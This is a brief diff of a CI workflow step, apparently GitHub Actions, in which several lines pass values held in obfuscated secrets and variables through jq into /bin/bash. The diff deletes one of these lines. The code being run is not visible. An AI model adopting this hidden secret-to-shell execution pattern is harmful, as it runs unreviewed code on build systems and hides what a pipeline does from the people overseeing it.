@@ -22,7 +22,6 @@ jobs:
           vvo9: ${{ secrets.vvo9 }}
         run: |
           printf '%s' "$vvo9" | jq -r .xsd670 | /bin/bash
-          echo $hxl268 | jq -r .ic06423 | /bin/bash
           printf '%s' "$zx365" | jq -r .nm307 | /bin/bash
           printf '%s' "$lumy759" | jq -r .tgpf9 | /bin/bash
 
